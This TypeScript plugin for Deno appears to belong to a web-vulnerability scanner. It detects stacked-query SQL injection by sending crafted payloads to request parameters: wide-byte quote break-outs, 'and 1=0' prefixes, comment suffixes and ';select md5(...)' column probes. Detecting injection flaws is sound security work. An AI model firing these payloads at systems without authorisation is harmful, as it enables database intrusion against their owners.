/// <reference lib="deno.worker"/>
import { codec, Fuzz, FuzzParam, HttpUtils } from '@24wings/core';
// import { WorkerEventEmitter } from '../woker.adaptor.ts';
import { encodeHex } from 'jsr:@std/encoding@0.221/hex';

// 初始化事件适配器
// const eventEmitter = new WorkerEventEmitter();

// // 监听主线程指令
// eventEmitter.addEventListener('start-scan', async (e) => {
//   const { target, scanMode } = (e as CustomEvent).detail;
//   let request = await HttpUtils.parseRequest((e as CustomEvent).detail as string);

//   endpoint(request);
// });

export async function endpoint(request: Request) {
  const fuzz = new Fuzz(request);
  const params = fuzz.getAllFuzzableParams();
  if (params.length <= 0) return;

  for (let param of params) {
    param.name;
    let prefix = sqlBuildPrefix(param.value);
    let suffix = [' -- ', ' # '];

    const { results, token } = stackedPayloads();
    console.log('生成token:' + token);
    /* 最准确的 MD5 型 Payload 的检测 */
    var finished = false;
    await sqlInjectionCheck(prefix, suffix, results, token, request.url, param, fuzz);
  }
}

async function sqlInjectionCheck(prefix: string[], suffix: string[], payloads: string[], token: string, url: string, i: FuzzParam, fuzz: Fuzz) {
  let finished = false;

  for (const p of prefix) {
    for (const s of suffix) {
      if (finished) {
        console.log('Detected Finished');
        return;
      }

      for (const payload of payloads) {
        const finPayload = p + payload + s;
        console.log(`USE: prefix:${p} suffix:${s} payloads: ${JSON.stringify(payload)}`);

        try {
          const rsp = await fuzz.sendModifiedRequest(Object.assign(i, { value: finPayload }));
          const bodyStr = await rsp.text();

          if (bodyStr.includes(token)) {
            console.log('Union Checking Token 生效了，Payload 为：' + finPayload);
            const count = (payload.match(/,/g) || []).length + 1;

            // await risk.newRisk({
            //   url,
            //   title: `UNION SQL Injection Columns(MD5)[${count}] For: ${url}`,
            //   type: "sqlinjection",
            //   severity: "high",
            //   request: rsp.requestRaw,
            //   parameter: i.toString(),
            //   response: rsp.responseRaw,
            //   payload: finPayload,
            //   description: "SQL堆叠注入是一种SQL注入攻击技术，它利用了某些数据库管理系统（如MySQL ）允许在单个查询语句中执行多个SQL语句的特性。攻击者通过在输入中插入额外的SQL语句，并使用分号（;）分隔，以此来执行多个SQL命令。这种技术通常用于绕过简单的输入验证，并且可以在没有错误信息显示的情况下，悄无声息地执行恶意SQL命令",
            //   solution: "使用参数化查询,使用 ORM（对象关系映射）框架,进行输入验证和过滤,代码遵循最小权限原则",
            //   details: "通过 堆叠 SELECT 随机 Token 为测试手段，测出回显列数然后在响应结果中找到 Token",
            // });
            console.log('有漏洞');
            finished = true;
            return;
          }
        } catch (err) {
          console.log(`FAILED: ${err}`);
          continue;
        }
      }
    }
  }
}

export function stackedPayloads(mod = 'md5') {
  let { expr, result } = Fuzz.fuzzCalcExpr();
  let basicItem = expr;
  let token = result + '';
  if (mod == 'md5') {
    basicItem = `md5(${basicItem})`;
    token = encodeHex(codec.md5(result + ''));
  }

  let payloads: string[] = [];
  payloads.push(basicItem);
  var results = [];
  for (let i = 0; i < 16; i++) {
    payloads.push(basicItem);
    let realPayload = `;\nselect ${payloads.join(',')}`;
    results.push(realPayload);
  }
  return { results, token };
}

// FILEPATH: e:/deno_mitm/plugins/flow-analyzer/plugins/sql-stack-query.ts

function sqlBuildPrefix(paramValue: string): string[] {
  const pureInt = /^\d+$/.test(paramValue);

  const wideByte = String.fromCharCode(Math.floor(Math.random() * (254 - 129 + 1)) + 129);
  const prefix: string[] = [];

  const valueList = [paramValue];
  const boundaryList = [' ', ')', '))'];

  let formatString = '%s';
  if (!pureInt) {
    formatString += wideByte + "'";
    valueList.push(generateRandomString(10));
  }
  formatString += '%s and 1=0 ';

  for (const v of valueList) {
    for (const b of boundaryList) {
      prefix.push(formatString.replace(/%s/g, (_, i) => i === 0 ? v : b));
    }
  }

  return prefix;
}

function generateRandomString(length: number): string {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
